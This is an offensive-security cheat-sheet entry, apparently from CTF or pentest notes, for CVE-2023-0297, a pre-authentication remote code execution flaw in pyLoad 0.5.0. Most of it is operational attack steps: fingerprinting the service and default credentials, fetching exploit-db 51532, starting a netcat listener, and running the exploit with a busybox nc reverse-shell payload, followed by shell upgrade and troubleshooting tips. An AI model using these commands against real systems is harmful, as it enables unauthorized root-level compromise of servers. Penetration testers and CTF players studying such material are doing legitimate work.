title: pyLoad 0.5.0 — CVE-2023-0297 Pre-Auth RCE
body:
pyLoad is a download manager with a web UI. Version 0.5.0 has a pre-authentication remote code execution vulnerability — no login required. The exploit directly spawns a reverse shell as the user running pyLoad (often root).

Fingerprint: nmap shows CherryPy wsgiserver on port 9666 (or 8000), http-title 'Login - pyLoad'. Default credentials are pyload/pyload but the CVE doesn't need them.
cmd:
# ══════════════════════════════════════════════════
# 1 — FINGERPRINT
# ══════════════════════════════════════════════════
# nmap: http-title: Login - pyLoad
#       http-server-header: Cheroot/8.6.0
# Default port: 9666 (sometimes 8000)
# Default creds (not needed for exploit): pyload/pyload

# ══════════════════════════════════════════════════
# 2 — EXPLOIT (pre-auth RCE)
# ══════════════════════════════════════════════════
searchsploit -m 51532
# or: https://www.exploit-db.com/exploits/51532

# Listener:
nc -lvnp <LPORT>

# Run exploit:
python3 51532.py -u http://<IP>:9666 -c "busybox nc <LHOST> <LPORT> -e /bin/bash"

# Shell lands as root (pyLoad often runs as root)
# Upgrade immediately:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z → stty raw -echo; fg → export TERM=xterm

# ══════════════════════════════════════════════════
# 3 — VERIFY VERSION (if you can log in)
# ══════════════════════════════════════════════════
# pyLoad dashboard → bottom of page or Settings → Info
# Version 0.5.0 = vulnerable
warn: The shell often lands directly as root since pyLoad runs with elevated privileges. If the exploit runs but no callback, check the port — pyLoad can run on 9666 or 8000 depending on the install. Always try busybox nc if standard nc -e fails.
